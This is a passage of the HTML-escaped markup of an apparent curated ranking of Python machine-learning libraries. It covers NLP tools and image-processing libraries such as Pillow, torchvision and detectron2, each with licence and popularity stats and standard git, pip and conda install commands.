· ⭐ 300) - boost inference speed of T5 models by 5x &amp;amp; reduce the model size by 3x. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/vrasneur/pyfasttext&#34;&gt;pyfasttext&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 230 · 💀) - Yet another Python binding for fastText. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/textpipe/textpipe&#34;&gt;textpipe&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 300 · 💤) - Textpipe: clean and extract metadata from text. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Franck-Dernoncourt/NeuroNER&#34;&gt;NeuroNER&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 1.6K · 💀) - Named-entity recognition using neural networks. Easy-to-use and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/shaypal5/skift&#34;&gt;skift&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 230) - scikit-learn wrappers for Python fastText. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/koursaros-ai/nboost&#34;&gt;nboost&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 620 · 💀) - NBoost is a scalable, search-api-boosting platform for deploying.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/dsfsi/textaugment&#34;&gt;textaugment&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 240) - TextAugment: Text Augmentation Library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/BLINK&#34;&gt;BLINK&lt;/a&gt;&lt;/b&gt; (🥉15 · ⭐ 880 · 💀) - Entity Linker solution. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/victordibia/neuralqa&#34;&gt;NeuralQA&lt;/a&gt;&lt;/b&gt; (🥉15 · ⭐ 220 · 💀) - NeuralQA: A Usable Library for Question Answering on Large Datasets.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/as-ideas/headliner&#34;&gt;Headliner&lt;/a&gt;&lt;/b&gt; (🥉14 · ⭐ 230 · 💀) - Easy training and deployment of seq2seq models. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jaidevd/numerizer&#34;&gt;numerizer&lt;/a&gt;&lt;/b&gt; (🥉14 · ⭐ 140) - A Python module to convert natural language numerics into ints and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/MartinoMensio/spacy-dbpedia-spotlight&#34;&gt;spacy-dbpedia-spotlight&lt;/a&gt;&lt;/b&gt; (🥉14 · ⭐ 61) - A spaCy wrapper for DBpedia Spotlight. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;spacy&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/feedly/transfer-nlp&#34;&gt;TransferNLP&lt;/a&gt;&lt;/b&gt; (🥉13 · ⭐ 290 · 💀) - NLP library designed for reproducible experimentation.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/abelriboulot/onnxt5&#34;&gt;ONNX-T5&lt;/a&gt;&lt;/b&gt; (🥉13 · ⭐ 200 · 💀) - Summarization, translation, sentiment-analysis, text-generation.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/textvec/textvec&#34;&gt;textvec&lt;/a&gt;&lt;/b&gt; (🥉13 · ⭐ 180 · 💀) - Text vectorization tool to outperform TFIDF for classification.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Image Data&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for image &amp;amp; video processing, manipulation, and augmentation as well as libraries for computer vision tasks such as facial recognition, object detection, and classification.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/python-pillow/Pillow&#34;&gt;Pillow&lt;/a&gt;&lt;/b&gt; (🥇45 · ⭐ 9.8K) - The friendly PIL fork (Python Imaging Library). &lt;code&gt;&lt;a href=&#34;https://tldrlegal.com/search?q=PIL&#34;&gt;❗️PIL&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/python-pillow/Pillow&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 400 · 🔀 1.9K · 📋 2.5K - 5% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/python-pillow/Pillow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/Pillow&#34;&gt;PyPi&lt;/a&gt; (📥 46M / month · 📦 63K · ⏱️ 17.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install Pillow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pillow&#34;&gt;Conda&lt;/a&gt; (📥 15M · ⏱️ 17.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pillow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/scikit-image/scikit-image&#34;&gt;scikit-image&lt;/a&gt;&lt;/b&gt; (🥇44 · ⭐ 4.9K) - Image processing in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/scikit-image/scikit-image&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 550 · 🔀 2K · 📦 100K · 📋 2.4K - 25% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/scikit-image/scikit-image&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/scikit-image&#34;&gt;PyPi&lt;/a&gt; (📥 8.9M / month · 📦 9.3K · ⏱️ 17.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install scikit-image&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/scikit-image&#34;&gt;Conda&lt;/a&gt; (📥 3.4M · ⏱️ 18.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge scikit-image&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pytorch/vision&#34;&gt;torchvision&lt;/a&gt;&lt;/b&gt; (🥇42 · ⭐ 12K) - Datasets, Transforms and Models specific to Computer Vision. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pytorch/vision&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 490 · 🔀 5.9K · 📥 5.7K · 📋 2.5K - 28% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pytorch/vision&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/torchvision&#34;&gt;PyPi&lt;/a&gt; (📥 5.3M / month · 📦 3.6K · ⏱️ 10.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install torchvision&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/torchvision&#34;&gt;Conda&lt;/a&gt; (📥 240K · ⏱️ 29.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge torchvision&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rwightman/pytorch-image-models&#34;&gt;PyTorch Image Models&lt;/a&gt;&lt;/b&gt; (🥇38 · ⭐ 19K) - PyTorch image models, scripts, pretrained weights --.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rwightman/pytorch-image-models&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 75 · 🔀 3.1K · 📥 1.2M · 📦 3K · 📋 510 - 12% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rwightman/pytorch-image-models&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/timm&#34;&gt;PyPi&lt;/a&gt; (📥 3.3M / month · 📦 94 · ⏱️ 15.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install timm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/timm&#34;&gt;Conda&lt;/a&gt; (📥 17K · ⏱️ 30.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge timm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/open-mmlab/mmdetection&#34;&gt;MMDetection&lt;/a&gt;&lt;/b&gt; (🥇37 · ⭐ 20K) - OpenMMLab Detection Toolbox and Benchmark. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/open-mmlab/mmdetection&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 340 · 🔀 7.3K · 📦 380 · 📋 5.9K - 9% open · ⏱️ 11.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/open-mmlab/mmdetection&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/mmdet&#34;&gt;PyPi&lt;/a&gt; (📥 38K / month · 📦 9 · ⏱️ 30.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install mmdet&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Zulko/moviepy&#34;&gt;MoviePy&lt;/a&gt;&lt;/b&gt; (🥇37 · ⭐ 9.2K) - Video editing with Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Zulko/moviepy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 150 · 🔀 1.2K · 📦 16K · 📋 1.2K - 24% open · ⏱️ 12.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Zulko/moviepy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/moviepy&#34;&gt;PyPi&lt;/a&gt; (📥 4.7M / month · 📦 750 · ⏱️ 05.10.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install moviepy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/moviepy&#34;&gt;Conda&lt;/a&gt; (📥 110K · ⏱️ 16.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge moviepy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/imageio/imageio&#34;&gt;imageio&lt;/a&gt;&lt;/b&gt; (🥈36 · ⭐ 1K) - Python library for reading and writing image data. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/imageio/imageio&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 90 · 🔀 210 · 📥 240 · 📦 62K · 📋 450 - 13% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/imageio/imageio&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/imageio&#34;&gt;PyPi&lt;/a&gt; (📥 18M / month · 📦 2.6K · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install imageio&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/imageio&#34;&gt;Conda&lt;/a&gt; (📥 2.9M · ⏱️ 17.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge imageio&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/kornia/kornia&#34;&gt;Kornia&lt;/a&gt;&lt;/b&gt; (🥈35 · ⭐ 6.6K) - Open Source Differentiable Computer Vision Library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/kornia/kornia&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 170 · 🔀 650 · 📥 310 · 📦 1.3K · 📋 590 - 27% open · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/kornia/kornia&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/kornia&#34;&gt;PyPi&lt;/a&gt; (📥 320K / month · 📦 54 · ⏱️ 17.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install kornia&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/kornia&#34;&gt;Conda&lt;/a&gt; (📥 16K · ⏱️ 17.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge kornia&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deepinsight/insightface&#34;&gt;InsightFace&lt;/a&gt;&lt;/b&gt; (🥈34 · ⭐ 12K) - State-of-the-art 2D and 3D Face Analysis Project. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1X&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/deepinsight/insightface&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 44 · 🔀 3.8K · 📦 160 · 📋 1.9K - 54% open · ⏱️ 22.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/deepinsight/insightface&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/insightface&#34;&gt;PyPi&lt;/a&gt; (📥 20K / month · 📦 5 · ⏱️ 29.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install insightface&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/opencv/opencv-python&#34;&gt;opencv-python&lt;/a&gt;&lt;/b&gt; (🥈34 · ⭐ 2.8K) - Automated CI toolchain to produce precompiled opencv-python,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/opencv/opencv-python&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 38 · 🔀 540 · 📋 540 - 7% open · ⏱️ 12.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/opencv/opencv-python&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/opencv-python&#34;&gt;PyPi&lt;/a&gt; (📥 5.5M / month · 📦 8.9K · ⏱️ 09.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install opencv-python&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition&#34;&gt;Face Recognition&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 44K · 💤) - The worlds simplest facial recognition api for Python.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 47 · 🔀 12K · 📥 460 · 📋 1.2K - 54% open · ⏱️ 14.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ageitgey/face_recognition&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/face_recognition&#34;&gt;PyPi&lt;/a&gt; (📥 56K / month · 📦 210 · ⏱️ 21.08.2018):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install face_recognition&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/face_recognition&#34;&gt;Conda&lt;/a&gt; (📥 6.5K · ⏱️ 30.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge face_recognition&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/detectron2&#34;&gt;detectron2&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 21K) - Detectron2 is a platform for object detection, segmentation.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/detectron2&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 210 · 🔀 5.7K · 📦 620 · 📋 3K - 7% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/detectron2&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/detectron2&#34;&gt;PyPi&lt;/a&gt; (📥 1 / month · 📦 3 · ⏱️ 06.02.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install detectron2&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/detectron2&#34;&gt;Conda&lt;/a&gt; (📥 53K · ⏱️ 25.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge detectron2&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/albumentations-team/albumentations&#34;&gt;Albumentations&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 10K) - Fast image augmentation library and an easy-to-use wrapper.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/albumentations-team/albumentations&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 100 · 🔀 1.3K · 📦 7.9K · 📋 640 - 45% open · ⏱️ 13.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/albumentations-team/albumentations&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/albumentations&#34;&gt;PyPi&lt;/a&gt; (📥 260K / month · 📦 210 · ⏱️ 04.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install albumentations&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/albumentations&#34;&gt;Conda&lt;/a&gt; (📥 37K · ⏱️ 15.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge albumentations&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/dmlc/gluon-cv&#34;&gt;GluonCV&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 5.2K) - Gluon CV Toolkit. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1X&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/dmlc/gluon-cv&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 120 · 🔀 1.2K · 📦 750 · 📋 820 - 7% open · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/dmlc/gluon-cv&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/gluoncv&#34;&gt;PyPi&lt;/a&gt; (📥 590K / month · 📦 59 · ⏱️ 26.05.2022):&lt;/p&gt; 